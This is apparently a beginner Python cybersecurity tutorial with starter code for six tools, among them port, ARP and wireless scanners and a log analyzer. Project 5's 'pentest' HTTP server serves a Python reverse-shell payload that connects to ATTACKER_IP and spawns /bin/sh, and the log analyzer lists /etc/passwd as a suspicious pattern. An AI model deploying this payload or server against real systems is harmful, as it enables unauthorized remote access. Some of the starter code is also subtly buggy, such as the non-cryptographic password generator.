# Python Basics - Projects

## Project 1: Port Scanner

### Description

Create a simple TCP port scanner that can scan a range of ports on a target IP address to determine if they're open, closed, or filtered.

### Requirements

- Accept target IP address and port range as input
- Scan each port in the range
- Determine port status (open/closed/filtered)
- Display results in a user-friendly format
- Handle timeouts and errors

### Starter Code

```python
#!/usr/bin/env python3
import socket
import argparse

def scan_port(ip, port, timeout=1):
    """Scan a single port"""
    socket.setdefaulttimeout(timeout)
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            result = sock.connect_ex((ip, port))
            if result == 0:
                return "open"
            elif result == 111:
                return "closed"
            else:
                return "filtered"
    except Exception as e:
        return f"error: {e}"

def scan_range(ip, start_port, end_port, timeout=1):
    """Scan a range of ports"""
    results = {}
    for port in range(start_port, end_port + 1):
        status = scan_port(ip, port, timeout)
        results[port] = status
    return results

def main():
    parser = argparse.ArgumentParser(
        description="Simple TCP Port Scanner"
    )
    parser.add_argument("target", help="Target IP address to scan")
    parser.add_argument(
        "-s", "--start", type=int, default=1,
        help="Start port (default: 1)"
    )
    parser.add_argument(
        "-e", "--end", type=int, default=100,
        help="End port (default: 100)"
    )
    parser.add_argument(
        "-t", "--timeout", type=int, default=1,
        help="Connection timeout (default: 1 second)"
    )

    args = parser.parse_args()

    print(f"Scanning {args.target} from port {args.start} to {args.end}")

    results = scan_range(args.target, args.start, args.end, args.timeout)

    print("\nPort Scan Results:")
    for port, status in sorted(results.items()):
        print(f"Port {port:5}: {status}")

    open_ports = [port for port, status in results.items() if status == "open"]
    print(f"\nTotal open ports: {len(open_ports)}")
    if open_ports:
        print(f"Open ports: {', '.join(map(str, open_ports))}")

if __name__ == "__main__":
    main()
```

### Challenges

1. Add service detection (e.g., HTTP, SSH) for open ports
2. Implement multithreading to speed up scanning
3. Add output to file functionality
4. Implement UDP port scanning
5. Add OS fingerprinting capabilities

## Project 2: Password Strength Checker

### Description

Create a password strength checker that evaluates passwords based on multiple criteria and provides suggestions for improvement.

### Requirements

- Analyze password strength based on length, character types, etc.
- Provide strength rating (weak/medium/strong/very strong)
- Offer suggestions for improvement
- Accept input from user or file
- Generate secure password suggestions

### Starter Code

```python
#!/usr/bin/env python3
import string
import random
import argparse

def check_password_strength(password):
    """Check password strength and provide feedback"""
    strength = 0
    feedback = []

    if len(password) >= 8:
        strength += 1
    else:
        feedback.append("Password should be at least 8 characters long")

    if len(password) >= 12:
        strength += 1
    else:
        feedback.append("Password should be at least 12 characters for better security")

    if any(c.isupper() for c in password):
        strength += 1
    else:
        feedback.append("Password should contain uppercase letters")

    if any(c.islower() for c in password):
        strength += 1
    else:
        feedback.append("Password should contain lowercase letters")

    if any(c.isdigit() for c in password):
        strength += 1
    else:
        feedback.append("Password should contain numbers")

    if any(c in string.punctuation for c in password):
        strength += 1
    else:
        feedback.append("Password should contain special characters (!@#$%^&*)")

    return strength, feedback

def generate_strong_password(length=16):
    """Generate a strong random password"""
    characters = string.ascii_letters + string.digits + string.punctuation
    password = ''.join(random.choice(characters) for _ in range(length))
    return password

def main():
    parser = argparse.ArgumentParser(
        description="Password Strength Checker"
    )
    parser.add_argument(
        "password", nargs='?',
        help="Password to check (will prompt if not provided)"
    )
    parser.add_argument(
        "-g", "--generate", type=int, default=0,
        help="Generate a strong password of specified length"
    )

    args = parser.parse_args()

    if args.generate > 0:
        password = generate_strong_password(args.generate)
        print(f"Generated strong password: {password}")
        strength, feedback = check_password_strength(password)
        print(f"Strength rating: {'*' * strength}/6")
        return

    if args.password:
        password = args.password
    else:
        password = input("Enter password to check: ").strip()

    strength, feedback = check_password_strength(password)

    print("\n=== Password Strength Check ===")
    print(f"Password: {password}")
    print(f"Strength rating: {'*' * strength}/6")

    if strength < 4:
        print("\nWeak password! Suggestions for improvement:")
        for item in feedback:
            print(f"- {item}")
    elif strength == 4:
        print("\nMedium password. Consider these improvements:")
        for item in feedback:
            print(f"- {item}")
    else:
        print("\nStrong password!")

if __name__ == "__main__":
    main()
```

### Challenges

1. Check for common passwords and patterns
2. Implement dictionary attack checking
3. Add support for checking password history
4. Implement password policy enforcement
5. Add password generation with specific requirements

## Project 3: Log File Analyzer

### Description

Create a log file analyzer that parses and analyzes log files for security-related events.

### Requirements

- Read and parse log files
- Identify security events (failed logins, suspicious activities)
- Generate reports on findings
- Support multiple log formats (Apache, Nginx, SSH)
- Search for specific patterns or keywords

### Starter Code

```python
#!/usr/bin/env python3
import re
import argparse
from collections import Counter

def analyze_apache_log(log_file):
    """Analyze Apache access log for security events"""
    failed_logins = []
    suspicious_entries = []
    ip_addresses = []

    # Regex patterns for common Apache log formats
    log_pattern = re.compile(r'(\d+\.\d+\.\d+\.\d+) - - \[(.*?)\] "(.*?)" (\d+) (\d+)')

    with open(log_file, 'r') as f:
        for line in f:
            match = log_pattern.match(line)
            if match:
                ip = match.group(1)
                ip_addresses.append(ip)
                request = match.group(3)
                status_code = int(match.group(4))

                # Check for failed login attempts
                if "POST /login" in request and status_code == 401:
                    failed_logins.append((ip, match.group(2), request))

                # Check for suspicious requests
                if any(x in request for x in ["/etc/passwd", "/admin", "/phpmyadmin"]):
                    suspicious_entries.append((ip, match.group(2), request))

    # Count IP addresses
    ip_counts = Counter(ip_addresses)

    return {
        "total_entries": len(ip_addresses),
        "failed_logins": len(failed_logins),
        "suspicious_entries": len(suspicious_entries),
        "top_ips": ip_counts.most_common(10),
        "detailed_failed_logins": failed_logins,
        "detailed_suspicious_entries": suspicious_entries
    }

def generate_report(results):
    """Generate HTML report from analysis results"""
    report = """
    <html>
    <head>
        <title>Security Log Analysis Report</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 20px; }
            h1 { color: #333; }
            .section { margin: 20px 0; padding: 15px; border: 1px solid #ddd; border-radius: 5px; }
            .event { background-color: #f5f5f5; padding: 10px; margin: 5px 0; }
            table { width: 100%; border-collapse: collapse; }
            th, td { border: 1px solid #ddd; padding: 8px; text-align: left; }
            th { background-color: #f2f2f2; }
        </style>
    </head>
    <body>
        <h1>Security Log Analysis Report</h1>

        <div class="section">
            <h2>Summary Statistics</h2>
            <p>Total entries: {total_entries}</p>
            <p>Failed logins: {failed_logins}</p>
            <p>Suspicious entries: {suspicious_entries}</p>
        </div>

        <div class="section">
            <h2>Top 10 IP Addresses</h2>
            <table>
                <tr><th>IP Address</th><th>Count</th></tr>
    """.format(**results)

    for ip, count in results['top_ips']:
        report += f"<tr><td>{ip}</td><td>{count}</td></tr>"

    report += """
            </table>
        </div>

        <div class="section">
            <h2>Failed Login Attempts</h2>
            <table>
                <tr><th>IP Address</th><th>Time</th><th>Request</th></tr>
    """

    for ip, time, request in results['detailed_failed_logins']:
        report += f"<tr><td>{ip}</td><td>{time}</td><td>{request}</td></tr>"

    report += """
            </table>
        </div>

        <div class="section">
            <h2>Suspicious Activities</h2>
            <table>
                <tr><th>IP Address</th><th>Time</th><th>Request</th></tr>
    """

    for ip, time, request in results['detailed_suspicious_entries']:
        report += f"<tr><td>{ip}</td><td>{time}</td><td>{request}</td></tr>"

    report += """
            </table>
        </div>
    </body>
    </html>
    """

    with open('security_report.html', 'w') as f:
        f.write(report)

    print("Report generated: security_report.html")

def main():
    parser = argparse.ArgumentParser(
        description="Security Log File Analyzer"
    )
    parser.add_argument(
        "log_file",
        help="Path to log file to analyze"
    )
    parser.add_argument(
        "-f", "--format", default="apache",
        help="Log file format (apache, nginx, ssh) (default: apache)"
    )
    parser.add_argument(
        "-r", "--report", action="store_true",
        help="Generate HTML report"
    )

    args = parser.parse_args()

    print(f"Analyzing {args.log_file} (format: {args.format})...")

    if args.format == "apache":
        results = analyze_apache_log(args.log_file)
    else:
        print(f"Unsupported log format: {args.format}")
        return

    print(f"\nAnalysis Complete!")
    print(f"Total entries: {results['total_entries']}")
    print(f"Failed logins: {results['failed_logins']}")
    print(f"Suspicious entries: {results['suspicious_entries']}")

    if args.report:
        generate_report(results)
    else:
        print("\nTop 10 IP Addresses:")
        for ip, count in results['top_ips']:
            print(f"  {ip}: {count} requests")

if __name__ == "__main__":
    main()
```

### Challenges

1. Add support for more log formats
2. Implement real-time log monitoring
3. Add severity levels to events
4. Implement alerting mechanisms (email, Slack)
5. Add visualization of log data

## Project 4: Network Scanner with ARP Discovery

### Description

Create a network scanner that uses ARP to discover devices on your local network.

### Requirements

- Discover all devices on the local network
- Identify device MAC addresses
- Determine device vendors
- Display network information
- Handle different network configurations

### Starter Code

```python
#!/usr/bin/env python3
import scapy.all as scapy
import argparse
import requests
import time

def get_vendor(mac_address):
    """Get vendor information from MAC address"""
    try:
        mac_prefix = mac_address[:8].upper().replace(':', '-')
        url = f"https://api.macvendors.com/{mac_prefix}"
        response = requests.get(url, timeout=5)

        if response.status_code == 200:
            return response.text.strip()
        else:
            return "Unknown Vendor"
    except Exception:
        return "Vendor Lookup Failed"

def scan_network(ip_range):
    """Scan network using ARP"""
    print(f"Scanning network: {ip_range}")
    print("=" * 60)
    print(f"{'IP Address':<15} {'MAC Address':<20} {'Vendor'}")
    print("=" * 60)

    arp_request = scapy.ARP(pdst=ip_range)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_broadcast = broadcast/arp_request

    answered_list = scapy.srp(arp_broadcast, timeout=1, verbose=False)[0]

    clients = []
    for element in answered_list:
        client_dict = {
            "ip": element[1].psrc,
            "mac": element[1].hwsrc,
            "vendor": get_vendor(element[1].hwsrc)
        }
        clients.append(client_dict)
        print(f"{client_dict['ip']:<15} {client_dict['mac']:<20} {client_dict['vendor']}")

    print("\nScan complete!")
    print(f"Found {len(clients)} devices on the network")

    return clients

def save_results(clients, filename):
    """Save scan results to file"""
    try:
        with open(filename, 'w') as f:
            f.write(f"{'IP Address':<15} {'MAC Address':<20} {'Vendor'}\n")
            f.write("=" * 60 + "\n")
            for client in clients:
                f.write(f"{client['ip']:<15} {client['mac']:<20} {client['vendor']}\n")
        print(f"\nResults saved to {filename}")
    except Exception as e:
        print(f"Error saving results: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="Local Network Scanner"
    )
    parser.add_argument(
        "ip_range",
        help="IP range to scan (e.g., 192.168.1.1/24)"
    )
    parser.add_argument(
        "-o", "--output",
        help="Output file for scan results (default: network_scan.txt)"
    )
    parser.add_argument(
        "-v", "--verbose", action="store_true",
        help="Enable verbose output"
    )

    args = parser.parse_args()

    if args.verbose:
        scapy.conf.verb = 1

    clients = scan_network(args.ip_range)

    output_file = args.output if args.output else "network_scan.txt"
    save_results(clients, output_file)

if __name__ == "__main__":
    main()
```

### Challenges

1. Implement continuous network monitoring
2. Add device fingerprinting capabilities
3. Detect and alert on new devices
4. Integrate with network mapping tools
5. Implement IP conflict detection

## Project 5: Simple HTTP Server for Penetration Testing

### Description

Create a simple HTTP server that can be used for penetration testing purposes, including serving malicious payloads, capturing request data, and more.

### Requirements

- Serve web pages
- Capture HTTP requests and responses
- Serve malicious payloads
- Log request details
- Support various HTTP methods

### Starter Code

```python
#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import argparse
import urllib.parse
import json

class PenTestHTTPRequestHandler(BaseHTTPRequestHandler):
    """Custom HTTP request handler for penetration testing"""

    def log_message(self, format, *args):
        """Custom log message format"""
        print(f"[{self.address_string()}] - {format % args}")

    def do_GET(self):
        """Handle GET requests"""
        parsed_path = urllib.parse.urlparse(self.path)

        print(f"=== GET Request ===")
        print(f"Path: {self.path}")
        print(f"Headers: {self.headers}")

        if self.path == "/":
            self.serve_index()
        elif self.path == "/payload":
            self.serve_payload()
        elif self.path == "/test":
            self.serve_test()
        else:
            self.send_error(404, "Not Found")

    def do_POST(self):
        """Handle POST requests"""
        content_length = int(self.headers.get('Content-Length', 0))
        post_data = self.rfile.read(content_length).decode('utf-8')

        print(f"=== POST Request ===")
        print(f"Path: {self.path}")
        print(f"Headers: {self.headers}")
        print(f"Body: {post_data}")

        # Parse form data or JSON
        try:
            if 'application/json' in self.headers.get('Content-Type', ''):
                data = json.loads(post_data)
            else:
                data = urllib.parse.parse_qs(post_data)

            print(f"Parsed Data: {data}")

        except Exception as e:
            print(f"Error parsing data: {e}")

        self.send_response(200)
        self.send_header('Content-Type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps({
            "status": "success",
            "message": "Request received",
            "data": {
                "method": "POST",
                "path": self.path,
                "headers": dict(self.headers),
                "body": post_data
            }
        }).encode('utf-8'))

    def serve_index(self):
        """Serve the main index page"""
        html_content = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>PenTest Server</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
                .container { max-width: 800px; margin: 0 auto; }
                h1 { color: #333; }
                .btn { padding: 10px 20px; background-color: #007bff; color: white; text-decoration: none; border-radius: 5px; margin-right: 10px; }
                .btn-danger { background-color: #dc3545; }
                .info { background-color: #f8f9fa; padding: 20px; border-radius: 5px; margin-top: 20px; }
            </style>
        </head>
        <body>
            <div class="container">
                <h1>PenTest Server</h1>
                <p>Welcome to the penetration testing HTTP server</p>

                <div class="info">
                    <h3>Server Information</h3>
                    <p>IP: {ip}</p>
                    <p>Port: {port}</p>
                </div>

                <h3>Available Endpoints:</h3>
                <a href="/test" class="btn">Test Page</a>
                <a href="/payload" class="btn btn-danger">Download Payload</a>
            </div>
        </body>
        </html>
        """.format(ip=self.server.server_address[0], port=self.server.server_address[1])

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(html_content.encode('utf-8'))

    def serve_test(self):
        """Serve a test page for XSS testing"""
        test_html = """
        <!DOCTYPE html>
        <html>
        <head>
            <title>Test Page</title>
            <style>
                body { font-family: Arial, sans-serif; margin: 40px; }
            </style>
        </head>
        <body>
            <h1>Test Page</h1>
            <p>This page is used for testing purposes</p>

            <h2>XSS Test</h2>
            <form method="POST" action="/test">
                <input type="text" name="xss_input" placeholder="Enter XSS payload">
                <button type="submit">Submit</button>
            </form>
        </body>
        </html>
        """

        self.send_response(200)
        self.send_header('Content-Type', 'text/html')
        self.end_headers()
        self.wfile.write(test_html.encode('utf-8'))

    def serve_payload(self):
        """Serve a malicious payload"""
        payload = """
        import socket
        import subprocess
        import os

        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("ATTACKER_IP", ATTACKER_PORT))
        os.dup2(s.fileno(), 0)
        os.dup2(s.fileno(), 1)
        os.dup2(s.fileno(), 2)
        subprocess.call(["/bin/sh", "-i"])
        """

        self.send_response(200)
        self.send_header('Content-Type', 'text/plain')
        self.send_header('Content-Disposition', 'attachment; filename="payload.py"')
        self.end_headers()
        self.wfile.write(payload.encode('utf-8'))

def start_server(ip, port):
    """Start the HTTP server"""
    try:
        server_address = (ip, port)
        httpd = HTTPServer(server_address, PenTestHTTPRequestHandler)
        print(f"Starting PenTest server on {ip}:{port}")
        print(f"Press Ctrl+C to stop the server")
        httpd.serve_forever()

    except KeyboardInterrupt:
        print("\nServer stopped by user")
        httpd.shutdown()
    except Exception as e:
        print(f"Error starting server: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="Penetration Testing HTTP Server"
    )
    parser.add_argument(
        "-i", "--ip", default="0.0.0.0",
        help="Server IP address (default: 0.0.0.0)"
    )
    parser.add_argument(
        "-p", "--port", type=int, default=8080,
        help="Server port (default: 8080)"
    )

    args = parser.parse_args()

    start_server(args.ip, args.port)

if __name__ == "__main__":
    main()
```

### Challenges

1. Implement HTTPS support
2. Add more payload types (PHP, ASP, etc.)
3. Implement request interception and modification
4. Add database integration for storing captured data
5. Implement websocket support for real-time communication

## Project 6: Wireless Network Scanner

### Description

Create a wireless network scanner that can discover and analyze nearby wireless networks.

### Requirements

- Scan for nearby wireless networks
- Display network details (SSID, MAC, signal strength)
- Identify encryption types (WEP, WPA, WPA2)
- Monitor network traffic
- Detect deauthentication attacks

### Starter Code

```python
#!/usr/bin/env python3
import scapy.all as scapy
import argparse
from prettytable import PrettyTable
import time

class WirelessNetworkScanner:
    """Wireless network scanner using Scapy"""

    def __init__(self, interface):
        """Initialize scanner"""
        self.interface = interface
        self.networks = {}
        self.start_time = time.time()

    def packet_handler(self, packet):
        """Handle captured packets"""
        if packet.haslayer(scapy.Dot11):
            # Management frames (beacons, probes)
            if packet.type == 0 and packet.subtype in [8, 5]:
                ssid = packet.info.decode(errors='ignore')
                bssid = packet.addr2

                if bssid not in self.networks:
                    self.networks[bssid] = {
                        "ssid": ssid,
                        "bssid": bssid,
                        "channel": packet.channel if hasattr(packet, 'channel') else 'N/A',
                        "signal_strength": packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else 'N/A',
                        "encryption": self._get_encryption(packet),
                        "beacons": 0,
                        "last_seen": time.time()
                    }

                self.networks[bssid]["beacons"] += 1
                self.networks[bssid]["last_seen"] = time.time()

                if hasattr(packet, 'dBm_AntSignal'):
                    self.networks[bssid]["signal_strength"] = packet.dBm_AntSignal

                if hasattr(packet, 'channel'):
                    self.networks[bssid]["channel"] = packet.channel

    def _get_encryption(self, packet):
        """Determine wireless encryption type"""
        if not hasattr(packet, 'info'):
            return 'Unknown'

        if packet.haslayer(scapy.Dot11Elt):
            elt = packet.getlayer(scapy.Dot11Elt)
            while elt and hasattr(elt, 'ID'):
                if elt.ID == 48:
                    return 'WPA2'
                elif elt.ID == 221 and elt.info.startswith(b'\x00\x50\xF2\x01'):
                    return 'WPA'
                elt = elt.payload

            if packet.haslayer(scapy.Dot11WEP):
                return 'WEP'

        return 'Open'

    def scan(self, timeout=30):
        """Start scanning for networks"""
        print(f"Starting wireless network scan on {self.interface}")
        print("Press Ctrl+C to stop scanning")

        try:
            scapy.sniff(
                iface=self.interface,
                prn=self.packet_handler,
                store=False,
                timeout=timeout
            )
        except KeyboardInterrupt:
            print("\nScan stopped by user")
        except Exception as e:
            print(f"Error scanning: {e}")

        return self.networks

    def display_results(self):
        """Display scan results in tabular format"""
        table = PrettyTable()
        table.field_names = [
            "SSID", "BSSID", "Channel", "Signal (dBm)",
            "Encryption", "Beacons", "Last Seen"
        ]

        sorted_networks = sorted(
            self.networks.values(),
            key=lambda x: (not x['ssid'], x['ssid'] if x['ssid'] else 'Hidden')
        )

        for network in sorted_networks:
            # Format signal strength
            signal_str = network['signal_strength']
            if isinstance(signal_str, int):
                if signal_str > -50:
                    signal_str = f"{signal_str} (Excellent)"
                elif signal_str > -70:
                    signal_str = f"{signal_str} (Good)"
                else:
                    signal_str = f"{signal_str} (Weak)"

            # Format SSID for hidden networks
            ssid = network['ssid'] or '[Hidden Network]'

            # Format last seen time
            last_seen = time.strftime("%H:%M:%S", time.localtime(network['last_seen']))

            table.add_row([
                ssid,
                network['bssid'],
                network['channel'],
                signal_str,
                network['encryption'],
                network['beacons'],
                last_seen
            ])

        print("\nWireless Network Scan Results:")
        print(f"Found {len(self.networks)} networks in {int(time.time() - self.start_time)} seconds")
        print(table)

        # Display summary
        print("\n=== Network Summary ===")
        encryption_counts = {}
        for network in self.networks.values():
            encryption = network['encryption']
            encryption_counts[encryption] = encryption_counts.get(encryption, 0) + 1

        for encryption, count in encryption_counts.items():
            print(f"{encryption}: {count} networks")

        hidden_networks = sum(1 for net in self.networks.values() if not net['ssid'])
        print(f"Hidden networks: {hidden_networks}")

    def save_results(self, filename):
        """Save results to file"""
        try:
            import csv

            with open(filename, 'w', newline='') as csvfile:
                fieldnames = ['SSID', 'BSSID', 'Channel', 'Signal', 'Encryption', 'Beacons', 'Last Seen']
                writer = csv.DictWriter(csvfile, fieldnames=fieldnames)

                writer.writeheader()

                for network in self.networks.values():
                    writer.writerow({
                        'SSID': network['ssid'] or '[Hidden Network]',
                        'BSSID': network['bssid'],
                        'Channel': network['channel'],
                        'Signal': network['signal_strength'],
                        'Encryption': network['encryption'],
                        'Beacons': network['beacons'],
                        'Last Seen': time.strftime("%H:%M:%S", time.localtime(network['last_seen']))
                    })

            print(f"\nResults saved to {filename}")
        except Exception as e:
            print(f"Error saving results: {e}")

def main():
    parser = argparse.ArgumentParser(
        description="Wireless Network Scanner"
    )
    parser.add_argument(
        "-i", "--interface", required=True,
        help="Wireless interface to use (must be in monitor mode)"
    )
    parser.add_argument(
        "-t", "--timeout", type=int, default=30,
        help="Scan duration in seconds (default: 30)"
    )
    parser.add_argument(
        "-o", "--output",
        help="Output CSV file (will display table if not provided)"
    )

    args = parser.parse_args()

    scanner = WirelessNetworkScanner(args.interface)
    networks = scanner.scan(args.timeout)

    if args.output:
        scanner.save_results(args.output)
    else:
        scanner.display_results()

if __name__ == "__main__":
    main()
```

### Challenges

1. Implement channel hopping for complete network discovery
2. Add support for packet injection
3. Implement wireless intrusion detection system (WIDS)
4. Add signal strength graphing and visualization
5. Implement network profiling and tracking

## Getting Started with Projects

### Prerequisites

- Install required libraries: `pip install scapy prettytable requests`
- For some projects, you may need additional permissions (e.g., root/administrator access)

### How to Use These Projects

1. Copy the starter code into new Python files
2. Read and understand the code (it's well-commented!)
3. Run the scripts from your terminal: `python script_name.py [arguments]`
4. Modify and expand the functionality based on the challenges
5. Test your implementations in safe, controlled environments

### Important Notes

- Always obtain proper authorization before testing on any system you don't own
- Use these tools responsibly for ethical hacking and learning purposes
- Keep your tools updated and be aware of legal implications

Remember, these projects are just starting points. As you learn more about Python and cybersecurity, you'll want to expand these tools with more advanced features, better error handling, and additional functionality tailored to your needs.
